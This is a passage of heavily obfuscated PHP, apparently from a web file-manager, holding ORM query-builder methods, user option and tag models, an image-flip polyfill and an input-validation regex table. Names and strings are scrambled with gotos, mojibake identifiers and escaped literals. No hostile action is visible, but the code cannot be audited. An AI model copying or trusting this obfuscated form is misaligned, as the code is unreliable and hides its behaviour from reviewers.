$bõò¥◊ºÑñ; } public function db($aûï÷∆Í°ì = '', $C∞ãµ…É–º = '', $e∑ä∂¢»≤» = array()) { goto eöÑ¥ØÌΩç; bﬂç·∂›œ¿: static $Eƒ…çÕˆßÓ = array(); if (!isset($Eƒ…çÕˆßÓ[$aûï÷∆Í°ì]) || isset($Eƒ…çÕˆßÓ[$aûï÷∆Í°ì]) && $C∞ãµ…É–º && $fÊú÷†ª»∂[$aûï÷∆Í°ì] != $C∞ãµ…É–º) { if (!empty($C∞ãµ…É–º) && is_string($C∞ãµ…É–º) && !1 === strpos($C∞ãµ…É–º, $bøñ–÷í£ä[8])) { $C∞ãµ…É–º = think_config($C∞ãµ…É–º); } $Eƒ…çÕˆßÓ[$aûï÷∆Í°ì] = Db::getInstance($C∞ãµ…É–º); } elseif (NULL === $C∞ãµ…É–º) { $Eƒ…çÕˆßÓ[$aûï÷∆Í°ì]->close(); unset($Eƒ…çÕˆßÓ[$aûï÷∆Í°ì]); return; } if (!empty($e∑ä∂¢»≤»)) { if (is_string($e∑ä∂¢»≤»)) { parse_str($e∑ä∂¢»≤», $e∑ä∂¢»≤»); } foreach ($e∑ä∂¢»≤» as $D‡¨∏ü•ó‘ => $FŸ·®ù∂îΩ) { $this->setProperty($D‡¨∏ü•ó‘, $FŸ·®ù∂îΩ); } } goto DÓ±ÏÆ€éÁ; eöÑ¥ØÌΩç: $bøñ–÷í£ä =& $_SERVER[¯èãÄπµ]; if ($bøñ–÷í£ä[33] === $aûï÷∆Í°ì && $this->db) { return $this->db; } static $fÊú÷†ª»∂ = array(); goto bﬂç·∂›œ¿; DµãŸ˘¯∫≈: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto Dﬁàﬂà–ƒö; DÓ±ÏÆ€éÁ: $fÊú÷†ª»∂[$aûï÷∆Í°ì] = $C∞ãµ…É–º; $this->db = $Eƒ…çÕˆßÓ[$aûï÷∆Í°ì]; $this->_after_db(); goto DµãŸ˘¯∫≈; Dﬁàﬂà–ƒö: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $FÑ±Ç¢Ω‰é = get_class($this); if ($FÑ±Ç¢Ω‰é == $_SERVER[¯èãÄπµ][330]) { return $this->name; } $this->name = substr($FÑ±Ç¢Ω‰é, 0, -5); } return $this->name; } public function getTableName() { $bÿÍÁèπµÍ =& $_SERVER[¯èãÄπµ]; if (empty($this->trueTableName)) { $Aƒß—á°’∞ = !empty($this->tablePrefix) ? $this->tablePrefix : $bÿÍÁèπµÍ[33]; if (!empty($this->tableName)) { $Aƒß—á°’∞ .= $this->tableName; } else { $Aƒß—á°’∞ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Aƒß—á°’∞); } return (!empty($this->dbName) ? $this->dbName . $bÿÍÁèπµÍ[91] : $bÿÍÁèπµÍ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Bì±¥»õì± =& $_SERVER[¯èãÄπµ]; return isset($this->fields[$Bì±¥»õì±[235]]) ? $this->fields[$Bì±¥»õì±[235]] : $this->pk; } public function getDbFields() { $B¢∫äÌæñà =& $_SERVER[¯èãÄπµ]; if (isset($this->options[$B¢∫äÌæñà[263]])) { $cúÙ÷ÛÇ‹ì = $this->db->getFields($this->options[$B¢∫äÌæñà[263]]); return $cúÙ÷ÛÇ‹ì ? array_keys($cúÙ÷ÛÇ‹ì) : !1; } if ($this->fields) { $cúÙ÷ÛÇ‹ì = $this->fields; unset($cúÙ÷ÛÇ‹ì[$B¢∫äÌæñà[234]], $cúÙ÷ÛÇ‹ì[$B¢∫äÌæñà[235]], $cúÙ÷ÛÇ‹ì[$B¢∫äÌæñà[236]], $cúÙ÷ÛÇ‹ì[$B¢∫äÌæñà[233]]); return $cúÙ÷ÛÇ‹ì; } return !1; } public function data($e®âÖåÃÖÏ = '') { $Có•≈û¯œ€ =& $_SERVER[¯èãÄπµ]; if ($Có•≈û¯œ€[33] === $e®âÖåÃÖÏ && !empty($this->data)) { return $this->data; } if (is_object($e®âÖåÃÖÏ)) { $e®âÖåÃÖÏ = get_object_vars($e®âÖåÃÖÏ); } elseif (is_string($e®âÖåÃÖÏ)) { parse_str($e®âÖåÃÖÏ, $e®âÖåÃÖÏ); } elseif (!is_array($e®âÖåÃÖÏ)) { think_exception(think_lang($Có•≈û¯œ€[255])); } $this->data = $e®âÖåÃÖÏ; return $this; } public function join($aÜ´‰ÉéÖÏ) { $aé¥ê‚ÚßÎ =& $_SERVER[¯èãÄπµ]; if (is_array($aÜ´‰ÉéÖÏ)) { $this->options[$aé¥ê‚ÚßÎ[266]] = $aÜ´‰ÉéÖÏ; } elseif (!empty($aÜ´‰ÉéÖÏ)) { $this->options[$aé¥ê‚ÚßÎ[266]][] = $aÜ´‰ÉéÖÏ; } return $this; } public function union($b—¨Çì÷Ñ∫, $Bù¨≤áÏã« = false) { goto f˜¨»ÑòüÆ; eÒ˘ç–¢≈ó: return $this; goto A∫Ù™ü–; f˜¨»ÑòüÆ: $dÇÊ´±ˆ» =& $_SERVER[¯èãÄπµ]; if (empty($b—¨Çì÷Ñ∫)) { return $this; } if ($Bù¨≤áÏã«) { $this->options[$dÇÊ´±ˆ»[331]][$dÇÊ´±ˆ»[332]] = !0; } goto E∫Ë¥◊∆Ëƒ; E∫Ë¥◊∆Ëƒ: if (is_object($b—¨Çì÷Ñ∫)) { $b—¨Çì÷Ñ∫ = get_object_vars($b—¨Çì÷Ñ∫); } if (is_string($b—¨Çì÷Ñ∫)) { $c÷”å÷É¬∑ = $b—¨Çì÷Ñ∫; } elseif (is_array($b—¨Çì÷Ñ∫)) { if (isset($b—¨Çì÷Ñ∫[0])) { $this->options[$dÇÊ´±ˆ»[331]] = array_merge($this->options[$dÇÊ´±ˆ»[331]], $b—¨Çì÷Ñ∫); return $this; } else { $c÷”å÷É¬∑ = $b—¨Çì÷Ñ∫; } } else { think_exception(think_lang($dÇÊ´±ˆ»[255])); } $this->options[$dÇÊ´±ˆ»[331]][] = $c÷”å÷É¬∑; goto eÒ˘ç–¢≈ó; A∫Ù™ü–: } public function cache($dø˘∆Ø‹£Ÿ = true, $d»”ﬁ’¶äˆ = null, $Eæ¿⁄à‡ö≈ = '') { $e‡öˆèãÎá =& $_SERVER[¯èãÄπµ]; if (!1 !== $dø˘∆Ø‹£Ÿ) { $this->options[$e‡öˆèãÎá[333]] = array($e‡öˆèãÎá[89] => $dø˘∆Ø‹£Ÿ, $e‡öˆèãÎá[323] => $d»”ﬁ’¶äˆ, $e‡öˆèãÎá[29] => $Eæ¿⁄à‡ö≈); } return $this; } public function field($aΩ˜è°Òë’, $C•è≠†Çì– = false) { $eá«éè…ãç =& $_SERVER[¯èãÄπµ]; if (!0 === $aΩ˜è°Òë’) { $EˆÈ≥ôá´˜ = $this->getDbFields(); $aΩ˜è°Òë’ = $EˆÈ≥ôá´˜ ? $EˆÈ≥ôá´˜ : $eá«éè…ãç[172]; } elseif ($C•è≠†Çì–) { if (is_string($aΩ˜è°Òë’)) { $aΩ˜è°Òë’ = explode($eá«éè…ãç[47], $aΩ˜è°Òë’); } $EˆÈ≥ôá´˜ = $this->getDbFields(); $aΩ˜è°Òë’ = $EˆÈ≥ôá´˜ ? array_diff($EˆÈ≥ôá´˜, $aΩ˜è°Òë’) : $aΩ˜è°Òë’; } $this->options[$eá«éè…ãç[257]] = $aΩ˜è°Òë’; return $this; } public function scope($Bü⁄ÇÂÜ† = '', $Cº¢ΩŒÊÂµ = NULL) { $C≈ëñû∫´â =& $_SERVER[¯èãÄπµ]; if ($C≈ëñû∫´â[33] === $Bü⁄ÇÂÜ†) { if (isset($this->_scope[$C≈ëñû∫´â[34]])) { $D∆î˜—§Ÿ = $this->_scope[$C≈ëñû∫´â[34]]; } else { return $this; } } elseif (is_string($Bü⁄ÇÂÜ†)) { $a∑ßë…â¥Ç = explode($C≈ëñû∫´â[47], $Bü⁄ÇÂÜ†); $D∆î˜—§Ÿ = array(); foreach ($a∑ßë…â¥Ç as $C»Â“Üãà∂) { if (!isset($this->_scope[$C»Â“Üãà∂])) { continue; } $D∆î˜—§Ÿ = array_merge($D∆î˜—§Ÿ, $this->_scope[$C»Â“Üãà∂]); } if (!empty($Cº¢ΩŒÊÂµ) && is_array($Cº¢ΩŒÊÂµ)) { $D∆î˜—§Ÿ = array_merge($D∆î˜—§Ÿ, $Cº¢ΩŒÊÂµ); } } elseif (is_array($Bü⁄ÇÂÜ†)) { $D∆î˜—§Ÿ = $Bü⁄ÇÂÜ†; } if (is_array($D∆î˜—§Ÿ) && !empty($D∆î˜—§Ÿ)) { $this->options = array_merge($this->options, array_change_key_case($D∆î˜—§Ÿ)); } return $this; } public function where($fÔÁºΩñÌß, $fûÇ‘ÖÌ±ƒ = null) { $c¬ÑéÉ™˜ =& $_SERVER[¯èãÄπµ]; if (!is_null($fûÇ‘ÖÌ±ƒ) && is_string($fÔÁºΩñÌß)) { if (!is_array($fûÇ‘ÖÌ±ƒ)) { $fûÇ‘ÖÌ±ƒ = func_get_args(); array_shift($fûÇ‘ÖÌ±ƒ); } $fûÇ‘ÖÌ±ƒ = array_map(array($this->db, $c¬ÑéÉ™˜[327]), $fûÇ‘ÖÌ±ƒ); $fÔÁºΩñÌß = vsprintf($fÔÁºΩñÌß, $fûÇ‘ÖÌ±ƒ); } elseif (is_object($fÔÁºΩñÌß)) { $fÔÁºΩñÌß = get_object_vars($fÔÁºΩñÌß); } elseif (is_array($fÔÁºΩñÌß)) { foreach ($fÔÁºΩñÌß as $c««§©¢—î => $dÿ¢ıÿêï≤) { if ((is_numeric($c««§©¢—î) || !$c««§©¢—î) && is_string($dÿ¢ıÿêï≤)) { think_trace($c¬ÑéÉ™˜[334], $c¬ÑéÉ™˜[33], $c¬ÑéÉ™˜[46]); die; } } } if (is_string($fÔÁºΩñÌß) && $c¬ÑéÉ™˜[33] != $fÔÁºΩñÌß) { $Dâı√ﬁ°ãç = array(); $Dâı√ﬁ°ãç[$c¬ÑéÉ™˜[335]] = $fÔÁºΩñÌß; $fÔÁºΩñÌß = $Dâı√ﬁ°ãç; } if (isset($this->options[$c¬ÑéÉ™˜[259]])) { $this->options[$c¬ÑéÉ™˜[259]] = array_merge($this->options[$c¬ÑéÉ™˜[259]], $fÔÁºΩñÌß); } else { $this->options[$c¬ÑéÉ™˜[259]] = $fÔÁºΩñÌß; } return $this; } public function limit($EªÛ””óÛÎ, $B∆çƒá†¡ª = null) { $aŒÔí°Ì›æ =& $_SERVER[¯èãÄπµ]; $this->options[$aŒÔí°Ì›æ[276]] = is_null($B∆çƒá†¡ª) ? $EªÛ””óÛÎ : $EªÛ””óÛÎ . $aŒÔí°Ì›æ[47] . $B∆çƒá†¡ª; return $this; } public function page($f¯ßÇ¢Èé≈, $eÏß£Òäõ = null) { $c√¨Ûÿ∆ÍÈ =& $_SERVER[¯èãÄπµ]; $this->options[$c√¨Ûÿ∆ÍÈ[336]] = is_null($eÏß£Òäõ) ? $f¯ßÇ¢Èé≈ : $f¯ßÇ¢Èé≈ . $c√¨Ûÿ∆ÍÈ[47] . $eÏß£Òäõ; return $this; } public function comment($bÈ¡‡ÊúƒË) { $this->options[$_SERVER[¯èãÄπµ][337]] = $bÈ¡‡ÊúƒË; return $this; } public function setProperty($b≠√©¬ëá˘, $C√¢◊∂Ç‰Ÿ) { if (property_exists($this, $b≠√©¬ëá˘)) { $this->{$b≠√©¬ëá˘} = $C√¢◊∂Ç‰Ÿ; } return $this; } } goto FÙÖﬂåï†ñ; Aã∆ç’êçà: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\x6f\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($C◊–çôﬂà‰) { $A©è¥»€Îô =& $_SERVER[¯èãÄπµ]; if (!defined($A©è¥»€Îô[423])) { define($A©è¥»€Îô[423], 0); } return "\x55\163\x65\x72\117\x70\164\151\157\x6e\x5f{$C◊–çôﬂà‰}\137" . USER_ID; } protected function filterWhere($a•ê∫Í¨èœ) { $fπƒ•ºª∂Õ =& $_SERVER[¯èãÄπµ]; if (!defined($fπƒ•ºª∂Õ[423])) { define($fπƒ•ºª∂Õ[423], 0); } $a•ê∫Í¨èœ[$fπƒ•ºª∂Õ[1424]] = USER_ID; return $a•ê∫Í¨èœ; } public function cacheRemoveUser($BÓõôÖí‡∏, $D®∑ƒÉ“û√) { return Cache::remove("\x55\163\145\162\x4f\160\164\x69\157\156\137{$BÓõôÖí‡∏}\x5f" . $D®∑ƒÉ“û√); } protected function optionDefault($D“ÉÀÓóÜ© = '') { $e∞ï∂¢Ìﬁ∏ =& $_SERVER[¯èãÄπµ]; if ($D“ÉÀÓóÜ© == $e∞ï∂¢Ìﬁ∏[33]) { return $GLOBALS[$e∞ï∂¢Ìﬁ∏[6]][$e∞ï∂¢Ìﬁ∏[2521]]; } if ($D“ÉÀÓóÜ© == $e∞ï∂¢Ìﬁ∏[2522]) { return $GLOBALS[$e∞ï∂¢Ìﬁ∏[6]][$e∞ï∂¢Ìﬁ∏[2523]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\141\147\x4c\x69\163\164"; public $modelType = "\125\x73\145\x72\x4f\160\x74\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\163\164\171\154\x65", "\163\x6f\x72\164"); public function listData($C›øÇ±‹πî = false, $bﬁªﬁñ®ÀÌ = "\x73\157\x72\164", $CÖ®ïÀÃ√§ = false) { return parent::listData($C›øÇ±‹πî, $bﬁªﬁñ®ÀÌ, $CÖ®ïÀÃ√§); } public function remove($CÖ––ŸÌÆ“) { return parent::remove($CÖ––ŸÌÆ“); } public function add($d‰Õ»Ç„—¢, $d•ù©∞∞Ó⁄ = "\154\x61\142\x65\x6c\55\x67\162\x65\171\55\x6e\157\x72\155\141\x6c") { $Aèªÿù¬à§ =& $_SERVER[¯èãÄπµ]; if ($this->findByName($d‰Õ»Ç„—¢)) { return !1; } $E™®ÕËŒÊâ = array($Aèªÿù¬à§[382] => $d‰Õ»Ç„—¢, $Aèªÿù¬à§[433] => $d•ù©∞∞Ó⁄, $Aèªÿù¬à§[2091] => $this->getSort($Aèªÿù¬à§[242]) + 1); return parent::insert($E™®ÕËŒÊâ); } public function update($aç®®˜–“ï, $Fª‹´Õ⁄õç) { $CÑÚ÷ë∞õÕ =& $_SERVER[¯èãÄπµ]; $CÀÕÇÔÍí’ = $this->listData($aç®®˜–“ï); $EÜñ≤†´ñÖ = $this->findByName($Fª‹´Õ⁄õç[$CÑÚ÷ë∞õÕ[28]]); if (!$CÀÕÇÔÍí’ || $EÜñ≤†´ñÖ && $EÜñ≤†´ñÖ[$CÑÚ÷ë∞õÕ[363]] != $CÀÕÇÔÍí’[$CÑÚ÷ë∞õÕ[363]]) { return !1; } return parent::update($aç®®˜–“ï, $Fª‹´Õ⁄õç); } public function moveTop($b£ó‡òﬁıÑ) { $cß√§‚èÈ° =& $_SERVER[¯èãÄπµ]; $f»ƒùÿ√∏Õ = parent::listData(); $EÈÊóÜøöØ = $this->getSort($cß√§‚èÈ°[241]); foreach ($f»ƒùÿ√∏Õ as &$Aöïïó˜á—) { if ($Aöïïó˜á—[$cß√§‚èÈ°[363]] == $b£ó‡òﬁıÑ) { $Aöïïó˜á—[$cß√§‚èÈ°[2108]] = $EÈÊóÜøöØ; continue; } $Aöïïó˜á—[$cß√§‚èÈ°[2108]] += 1; } return parent::resetData($f»ƒùÿ√∏Õ); } public function moveBottom($C·éÇæÈÇ) { $bª÷ôó‰ôë =& $_SERVER[¯èãÄπµ]; $CÔùëìèëí = $this->getSort($bª÷ôó‰ôë[242]) + 1; return parent::update($C·éÇæÈÇ, array($bª÷ôó‰ôë[2108] => $CÔùëìèëí)); } public function resetSort($b±‰¿ªÑ◊Û) { goto CÉÖÖáæ◊Ê; cÁéœ∑Ÿã◊: for ($dÀ†ô±æÀë = 0; $dÀ†ô±æÀë < count($b±‰¿ªÑ◊Û); $dÀ†ô±æÀë++) { $Aãã∫≠©µç[$b±‰¿ªÑ◊Û[$dÀ†ô±æÀë] . $cîˆ„„Ì∞ú[33]] = $dÀ†ô±æÀë + 1; } $bì”⁄±Œ≤ = parent::listData(); foreach ($bì”⁄±Œ≤ as &$f™‰‹∏ƒ∞Ê) { $Dø’®ÎÀé = $Aãã∫≠©µç[$f™‰‹∏ƒ∞Ê[$cîˆ„„Ì∞ú[363]]]; $f™‰‹∏ƒ∞Ê[$cîˆ„„Ì∞ú[2108]] = $Dø’®ÎÀé ? $Dø’®ÎÀé : $f™‰‹∏ƒ∞Ê[$cîˆ„„Ì∞ú[2108]]; } goto EôﬁìñÖ√˘; CÉÖÖáæ◊Ê: $cîˆ„„Ì∞ú =& $_SERVER[¯èãÄπµ]; $Aãã∫≠©µç = array(); $b±‰¿ªÑ◊Û = is_array($b±‰¿ªÑ◊Û) ? $b±‰¿ªÑ◊Û : array(); goto cÁéœ∑Ÿã◊; EôﬁìñÖ√˘: return parent::resetData($bì”⁄±Œ≤); goto e∏£©ªõ∫ª; e∏£©ªõ∫ª: } private function getSort($bá¶ı≠¢ûÇ) { $fÜ«Ïµ˘… =& $_SERVER[¯èãÄπµ]; $Düø˘Ëôàï = parent::listData(); $c…äØÙœíÃ = array_to_keyvalue($Düø˘Ëôàï, $fÜ«Ïµ˘…[33], $fÜ«Ïµ˘…[2108]); if (!$c…äØÙœíÃ) { $c…äØÙœíÃ = array(0); } $CôÀ∆öå∏© = $bá¶ı≠¢ûÇ == $fÜ«Ïµ˘…[242] ? max($c…äØÙœíÃ) : min($c…äØÙœíÃ); return intval($CôÀ∆öå∏©); } } goto BØÑ◊Õ∑∂‚; f¶ÀôÆô¯ã: if (!function_exists($_SERVER[¯èãÄπµ][1855])) { define($_SERVER[¯èãÄπµ][1856], 0); define($_SERVER[¯èãÄπµ][1857], 1); define($_SERVER[¯èãÄπµ][1858], 2); function imageflip($bŸúÃ≈¥ÛÃ, $Bä≤ﬂ¶¶ŒÈ) { switch ($Bä≤ﬂ¶¶ŒÈ) { case IMG_FLIP_HORIZONTAL: $f¬º‚ÍÇÜ› = imagesx($bŸúÃ≈¥ÛÃ) - 1; $e…œÑö…¯Ÿ = $f¬º‚ÍÇÜ› / 2; $e›àô¿º†ä = imagesy($bŸúÃ≈¥ÛÃ); $AÆ€Èã¨ˆ’ = imageistruecolor($bŸúÃ≈¥ÛÃ) ? imagecreatetruecolor(1, $e›àô¿º†ä) : imagecreate(1, $e›àô¿º†ä); for ($b”áß®Øû„ = 0; $b”áß®Øû„ < $e…œÑö…¯Ÿ; ++$b”áß®Øû„) { imagecopy($AÆ€Èã¨ˆ’, $bŸúÃ≈¥ÛÃ, 0, 0, $b”áß®Øû„, 0, 1, $e›àô¿º†ä); imagecopy($bŸúÃ≈¥ÛÃ, $bŸúÃ≈¥ÛÃ, $b”áß®Øû„, 0, $f¬º‚ÍÇÜ› - $b”áß®Øû„, 0, 1, $e›àô¿º†ä); imagecopy($bŸúÃ≈¥ÛÃ, $AÆ€Èã¨ˆ’, $f¬º‚ÍÇÜ› - $b”áß®Øû„, 0, 0, 0, 1, $e›àô¿º†ä); } break; case IMG_FLIP_VERTICAL: $F§ŒŒ’≤ΩÉ = imagesx($bŸúÃ≈¥ÛÃ); $bÚÑ⁄ÃÖ¡Ê = imagesy($bŸúÃ≈¥ÛÃ) - 1; $däﬁÍï¨Íá = $bÚÑ⁄ÃÖ¡Ê / 2; $AÆ€Èã¨ˆ’ = imageistruecolor($bŸúÃ≈¥ÛÃ) ? imagecreatetruecolor($F§ŒŒ’≤ΩÉ, 1) : imagecreate($F§ŒŒ’≤ΩÉ, 1); for ($fœ≈ÊãÏë˘ = 0; $fœ≈ÊãÏë˘ < $däﬁÍï¨Íá; ++$fœ≈ÊãÏë˘) { imagecopy($AÆ€Èã¨ˆ’, $bŸúÃ≈¥ÛÃ, 0, 0, 0, $fœ≈ÊãÏë˘, $F§ŒŒ’≤ΩÉ, 1); imagecopy($bŸúÃ≈¥ÛÃ, $bŸúÃ≈¥ÛÃ, 0, $fœ≈ÊãÏë˘, 0, $bÚÑ⁄ÃÖ¡Ê - $fœ≈ÊãÏë˘, $F§ŒŒ’≤ΩÉ, 1); imagecopy($bŸúÃ≈¥ÛÃ, $AÆ€Èã¨ˆ’, 0, $bÚÑ⁄ÃÖ¡Ê - $fœ≈ÊãÏë˘, 0, 0, $F§ŒŒ’≤ΩÉ, 1); } break; case IMG_FLIP_BOTH: $F§ŒŒ’≤ΩÉ = imagesx($bŸúÃ≈¥ÛÃ); $e›àô¿º†ä = imagesy($bŸúÃ≈¥ÛÃ); $AÆ€Èã¨ˆ’ = imagerotate($bŸúÃ≈¥ÛÃ, 180, 0); imagecopy($bŸúÃ≈¥ÛÃ, $AÆ€Èã¨ˆ’, 0, 0, 0, 0, $F§ŒŒ’≤ΩÉ, $e›àô¿º†ä); break; default: return; } imagedestroy($AÆ€Èã¨ˆ’); } } if (!function_exists($_SERVER[¯èãÄπµ][1859])) { function imagecreatefrombmp($fúüßóÚˆ¿) { return ImageGdBMP::load($fúüßóÚˆ¿); } } class Input { public static function getArray($f©üß”´¯´) { goto f’¬ÉÑñº™; aûûÌ§√üè: $e≈◊ÆÜü®ä = array(); $e»”˜πÎÑÉ = LNG($E‚πÒ‘ñÚÖ[1860]); foreach ($f©üß”´¯´ as $A‡Ö¶≤ÆîÖ => $EÌÙÙ€õûú) { goto A„Ï‚ÎÙÊ≤; A„Ï‚ÎÙÊ≤: $B≈ï”◊¡€π = _get($EÌÙÙ€õûú, $E‚πÒ‘ñÚÖ[1242], $e»”˜πÎÑÉ . $E‚πÒ‘ñÚÖ[884] . $A‡Ö¶≤ÆîÖ); $dï∆€√ãµ’ = $A‡Ö¶≤ÆîÖ; if (isset($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1861]]) && $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1861]]) { $dï∆€√ãµ’ = $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1861]]; } goto EêüÉƒœÂª; EêüÉƒœÂª: if (!array_key_exists($A‡Ö¶≤ÆîÖ, $in)) { if (array_key_exists($E‚πÒ‘ñÚÖ[1862], $EÌÙÙ€õûú)) { if (!is_null($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1862]])) { $bŸ∂ıˆıÜ´[$dï∆€√ãµ’] = $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1862]]; } } else { if (isset($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1863]])) { $e≈◊ÆÜü®ä[] = $B≈ï”◊¡€π; } } continue; } if (isset($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1863]]) && $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1863]] == $E‚πÒ‘ñÚÖ[278]) { $f“Ò∫ “ﬂæ = json_decode($in[$A‡Ö¶≤ÆîÖ], !0); if (is_array($f“Ò∫ “ﬂæ)) { $bŸ∂ıˆıÜ´[$dï∆€√ãµ’] = $f“Ò∫ “ﬂæ; } else { if (array_key_exists($E‚πÒ‘ñÚÖ[1862], $EÌÙÙ€õûú)) { if (!is_null($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1862]])) { $bŸ∂ıˆıÜ´[$dï∆€√ãµ’] = $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1862]]; } } else { $e≈◊ÆÜü®ä[] = $B≈ï”◊¡€π; } } continue; } $cë…óŸ¥´ö = _get($EÌÙÙ€õûú, $E‚πÒ‘ñÚÖ[1013]); goto aµƒ‹Ñ•Œ©; aµƒ‹Ñ•Œ©: if (isset($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1863]]) && !self::check($in[$A‡Ö¶≤ÆîÖ], $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1863]], $cë…óŸ¥´ö)) { if (array_key_exists($E‚πÒ‘ñÚÖ[1862], $EÌÙÙ€õûú)) { if (!is_null($EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1862]])) { $bŸ∂ıˆıÜ´[$dï∆€√ãµ’] = $EÌÙÙ€õûú[$E‚πÒ‘ñÚÖ[1862]]; } } else { $e≈◊ÆÜü®ä[] = $B≈ï”◊¡€π; } continue; } $bŸ∂ıˆıÜ´[$dï∆€√ãµ’] = $in[$A‡Ö¶≤ÆîÖ]; goto Bñ«±Ìô•; Bñ«±Ìô•: } goto a≥µÖ˜“üí; f’¬ÉÑñº™: $E‚πÒ‘ñÚÖ =& $_SERVER[¯èãÄπµ]; global $in; $bŸ∂ıˆıÜ´ = array(); goto aûûÌ§√üè; a≥µÖ˜“üí: if (count($e≈◊ÆÜü®ä) > 0) { show_json(implode($E‚πÒ‘ñÚÖ[1864], $e≈◊ÆÜü®ä), !1); } return $bŸ∂ıˆıÜ´; goto Aë÷Âÿ®õ·; Aë÷Âÿ®õ·: } public static function reg($Bãå¬îÇ‹¥ = "\162\145\161\x75\x69\x72\x65") { static $dÙ∞ÙﬂªæÆ = array("\x72\145\161\165\151\162\145" => "\56\53", "\156\x75\x6d\x62\x65\x72" => "\134\144\x2b", "\150\x65\x78" => "\133\60\x2d\x39\x41\x2d\106\141\x2d\146\135\53", "\x69\156\164" => "\133\55\x5c\x2b\135\x3f\x5c\x64\x2b", "\x62\x6f\157\154" => "\60\x7c\61", "\146\154\x6f\x61\164" => "\133\x2d\x5c\53\x5d\77\134\x64\x2b\50\x5c\x2e\x5c\x64\53\51\x3f", "\145\156\x67\x6c\x69\x73\x68" => "\133\x41\x2d\x5a\141\55\x7a\x20\x5d\x2b", "\143\150\151\x6e\145\163\145" => "\x5b\134\170\x7b\64\145\x30\60\175\x2d\134\170\x7b\71\x66\x61\65\x7d\x5d\53", "\150\x61\163\x43\150\151\156\145\163\x65" => "\57\50\x5b\x5c\x78\x7b\64\145\x30\x30\175\x2d\134\170\173\x39\x66\x61\x35\175\x5d\x2b\51\x2f\165", "\145\155\x61\x69\x6c" => "\134\167\x2b\x28\x5b\134\56\x5c\55\135\x5c\x77\x2b\x29\x2a\134\x40\x5c\167\x2b\50\133\x5c\x2e\x5c\x2d\135\134\167\53\51\x2a\134\x2e\x5c\x77\53", "\x70\150\157\156\x65" => "\61\x5b\63\x2d\71\x5d\x5c\x64\173\x39\x7d", "\164\x65\x6c\160\150\157\x6e\x65" => "\x28\134\50\x5c\144\x7b\63\x2c\64\x7d\x5c\51\x7c\134\144\x7b\63\54\x34\x7d\55\174\x5c\x73\51\77\x5c\144\x7b\67\54\x31\x34\x7d", "\165\162\x6c" => "\x28\x68\x74\x74\x70\x7c\x66\x74\x70\174\150\x74\x74\160\x73\51\x3a\x5c\x2f\x5c\57\x5b\x5c\167\134\55\x5f\x5d\x2b\50\x5c\x2e\133\134\x77\x5c\x2d\x5f\x5d\53\51\x2b\50\x5b\x5c\x77\134\x2d\x5c\56\54\100\77\136\75\45\x26\72\134\x2f\176\134\53\43\x5d\52\x5b\x5c\x77\134\55\x5c\x40\x3f\x5e\75\x25\46\134\57\176\x5c\53\43\135\x29\x3f", "\x75\162\154\106\x75\x6c\154" => "\133\141\x2d\172\101\x2d\172\x5d\x2b\72\x5c\x2f\134\x2f\133\136\x5c\x73\135\x2a", "\x69\160" => "\50\x5c\x64\x7b\61\54\x33\175\x5c\x2e\x29\x7b\63\x7d\x28\134\x64\173\61\x2c\x33\175\51", "\x7a\151\160" => "\x5b\61\x2d\71\135\134\144\x7b\x35\x7d\x28\x3f\x21\134\x64\51", "\x69\144\103\x61\x72\x64" => "\50\x5c\144\173\61\65\175\51\x7c\50\x5c\x64\173\61\x37\x7d\50\x5c\x64\x7c\x58\174\170\x29\51", "\x63\157\x6c\157\x72" => "\x23\50\133\x30\x2d\71\101\55\106\x61\x2d\x66\135\173\63\175\174\133\60\x2d\71\101\55\106\x61\55\x66\135\x7b\66\x7d\51", "\164\x69\x6d\x65" => "\50\x5b\60\x2d\61\135\x5c\144\174\62\133\x30\x2d\x34\x5d\x29\72\133\x30\55\65\135\134\144", "\x64\141\164\x65" => "\x5c\144\x7b\64\175\x5b\x2d\134\57\135\77\50\60\133\61\55\x39\x5d\x7c\61\x5b\x30\x2d\62\135\x29\x5b\55\134\57\135\x3f\50\133\60\55\x32\x5d\x5c\144\174\x33\x5b\60\55\61\x5d\x29", "\144\x61\x74\x65\124\x69\155\145" => "\134\x64\173\64\175\133\55\x5c\57\x5d\77\50\x30\x5b\61\55\71\135\x7c\61\x5b\60\55\62\135\x29\133\55\134\x2f\135\x3f\50\x5b\x30\x2d\x32\135\x5c\x64\x7c\63\133\x30\x2d\x31\135\51\134\163\53\50\x5b\60\55\x31\x5d\x5c\x64\x7c\x32\x5b\x30\x2d\x34\135\x29\x3a\133\60\55\x35\x5d\x5c\144", "\x70\x61\163\163\167\157\x72\144" => "\50\77\75\x2e\52\134\x64\51\50\x3f\x3d\x2e\52\x5b\x61\55\x7a\135\51\x28\77\75\x2e\52\x5b\x41\x2d\x5a\135\x29\x2e\173\x38\54\x32\60\175", "\x6b\x65\171" => "\x5b\101\55\x5a\x61\55\x7a\60\55\x39\137\134\55\x5c\56\x5d\x2b", "\153\x65\171\106\165\x6c\154" => "\x5b\x41\55\132\x61\x2d\172\x30\55\71\x5f\x5c\x2d\134\x2e\134\x73\54\135\53"); if (!$Bãå¬îÇ‹¥) { return 